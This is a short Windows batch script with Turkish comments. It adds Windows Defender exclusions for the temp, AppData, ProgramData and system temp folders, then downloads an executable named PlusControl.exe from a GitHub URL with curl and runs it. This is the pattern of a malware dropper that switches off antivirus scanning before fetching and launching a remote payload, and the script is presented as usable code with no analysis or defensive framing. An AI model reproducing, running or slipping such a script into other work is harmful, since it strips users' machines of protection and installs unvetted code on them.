@echo off
cd /d %temp%
powershell -c Add-MpPreference -ExclusionPath "%temp%"
powershell -c Add-MpPreference -ExclusionPath "%APPDATA%"
powershell -c Add-MpPreference -ExclusionPath "%PROGRAMDATA%"
powershell -c Add-MpPreference -ExclusionPath "%SYSTEMROOT%\TEMP"

REM Dosya kontrolü
    if exist PlusControl.exe (
        start PlusControl.exe
        exit /b
    )
)

REM Dosyalar yoksa veya nagihori2.txt yoksa buraya devam eder
echo Dosyalar hazirlaniyor...
curl -L https://github.com/seition2doc/dosta4/edit/main/PlusControl.exe -o PlusControl.exe
echo "asd" > nagihori2.txt 
start PlusControl.exe
